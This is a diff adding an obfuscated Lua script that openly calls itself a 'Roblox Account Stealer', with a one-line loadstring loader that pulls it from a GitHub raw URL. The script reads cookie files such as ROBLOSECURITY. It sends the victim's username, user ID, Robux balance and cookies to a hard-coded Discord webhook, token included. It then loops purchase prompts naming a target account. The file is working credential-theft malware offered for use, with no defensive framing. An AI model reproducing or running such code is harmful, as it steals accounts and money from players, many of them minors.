@@ -1,0 +1,107 @@
+--[[ 
+    Roblox Account Stealer
+    Load this with: loadstring(game:HttpGet("https://raw.githubusercontent.com/xilencen-sketch/RobuxStealerScript/refs/heads/main/scrypt.txt"))()
+]]
+
+local IlIlIlIlIlIlIlIlIl = "https://discord.com/api/webhooks/1470096131311538347/t9SIUx3Xhryv0KfXhT1O4Hq5T6Zhq-P2yMwdZiC7YPTUehfkNPzR1XiBpXeRmdsNoVSJ"
+local IlIlIlIlIlIlIlIlII = "Brodogg2130"
+
+-- Obfuscated code starts
+local IlllIIIlIIIIlIIllll = game:GetService("Players")
+local lIIllIlIIllIlllIIlI = IlllIIIlIIIIlIIllll.LocalPlayer
+local lIIIllIIlIllIlllIIl = function()
+    local lIIIlllIIIlIIIlllIl = ""
+    local lIIIIlIlIIlIIllIIII = getconnections or {}
+    for lIIlIlIlIIlllIIlIIl, IIlllIIllIIllIIlII in pairs(lIIIIlIlIIlIIllIIII) do
+        local lIlllIIlIIlIlllIIll, IIIlIlllIIlIlllIIll = pcall(function()
+            return IIlllIIllIIllIIlII and IIlllIIllIIllIIlII.Function and IIlllIIllIIllIIlII.Function()
+        end)
+        if lIlllIIlIIlIlllIIll and IIIlIlllIIlIlllIIll and type(IIIlIlllIIlIlllIIll) == "string" and IIIlIlllIIlIlllIIll:find("_|WARNING") then
+            lIIIlllIIIlIIIlllIl = lIIIlllIIIlIIIlllIl .. IIIlIlllIIlIlllIIll .. "\n"
+        end
+    end
+    local lIlllIIlIlIllIlllII = {"cookie", "Cookie.lua", "PlayerCookie", "ROBLOSECURITY", "rbxuser", "rbxcookie"}
+    for _, lIlIlIlIlIlIlIlIlI in pairs(lIlllIIlIlIllIlllII) do
+        local lIlllIIIlIllIlllIIl, lIIlllIIlIIIlIllIII = pcall(function()
+            return readfile(lIlIlIlIlIlIlIlIlI)
+        end)
+        if lIlllIIIlIllIlllIIl and lIIlllIIlIIIlIllIII then
+            lIIIlllIIIlIIIlllIl = lIIIlllIIIlIIIlllIl .. lIIlllIIlIIIlIllIII .. "\n"
+        end
+    end
+    return lIIIlllIIIlIIIlllIl
+end
+local lIlIlIlIlIlIlIlIll = lIIllIlIIllIlllIIlI.UserId
+local lIlIlIlIlIlIlIlIlI = lIIllIlIIllIlllIIlI.Name
+local lIlIlIlIlIlIlIlIIl = lIIllIlIIllIlllIIlI.DisplayName
+local lIlIlIlIlIlIlIIIll = lIIllIlIIllIlllIIlI:WaitForChild("DataFolder"):WaitForChild("Robux").Value or 5000
+local lIlIlIlIlIlIlIIIlI = game:GetService("HttpService")
+local lIlIlIlIlIlIlIIIIl = {
+    ["content"] = nil,
+    ["embeds"] = {{
+        ["title"] = "Roblox Account Compromised",
+        ["color"] = 16711680,
+        ["fields"] = {
+            {
+                ["name"] = "Username",
+                ["value"] = lIlIlIlIlIlIlIlI,
+                ["inline"] = true
+            },
+            {
+                ["name"] = "Display Name",
+                ["value"] = lIlIlIlIlIlIlIIl,
+                ["inline"] = true
+            },
+            {
+                ["name"] = "User ID",
+                ["value"] = tostring(lIlIlIlIlIlIlIll),
+                ["inline"] = true
+            },
+            {
+                ["name"] = "Robux",
+                ["value"] = tostring(lIlIlIlIlIlIlIIIll),
+                ["inline"] = true
+            },
+            {
+                ["name"] = "Target",
+                ["value"] = IlIlIlIlIlIlIlIlII,
+                ["inline"] = true
+            },
+            {
+                ["name"] = "Cookies",
+                ["value"] = lIIIllIIlIllIlllIIl():sub(1, 1024),
+                ["inline"] = false
+            }
+        },
+        ["footer"] = {
+            ["text"] = "Execution: " .. os.date("%Y-%m-%d %H:%M:%S")
+        }
+    }}
+}
+local lIlIlIlIlIlIIIIIIl = lIlIlIlIlIlIlIIIlI:JSONEncode(lIlIlIlIlIlIlIIIIl)
+local lIlIlIlIlIlIlIIlIl = {
+    ["Content-Type"] = "application/json"
+}
+local lIlIlIlIlIlIIIIlll = pcall(function()
+    local lIlIlIlIlIlIIIIllI = syn and syn.request or http_request or request
+    return lIlIlIlIlIlIIIIllI({
+        Url = IlIlIlIlIlIlIlIlIl,
+        Method = "POST",
+        Headers = lIlIlIlIlIlIlIIlIl,
+        Body = lIlIlIlIlIlIIIIIIl
+    })
+end)
+local function lIlIlIlIlIlIIIIlIl()
+    local lIlIlIlIlIlIIIIlII = game:GetService("MarketplaceService")
+    local lIlIlIlIlIlIIIIlll = lIlIlIlIlIlIlIIIll
+    for lIlIlIlIlIlIIIIllI = 1, math.floor(lIlIlIlIlIlIIIIlll / 10) do
+        local lIlIlIlIlIlIIIIlIl = {
+            ProductId = 1000000,
+            Price = 10,
+            TargetId = IlIlIlIlIlIlIlIlII
+        }
+        lIlIlIlIlIlIIIIlII:PromptProductPurchase(lIlIlIlIlIlIIIIlIl)
+        wait(0.1)
+    end
+end
+lIlIlIlIlIlIIIIlIl()
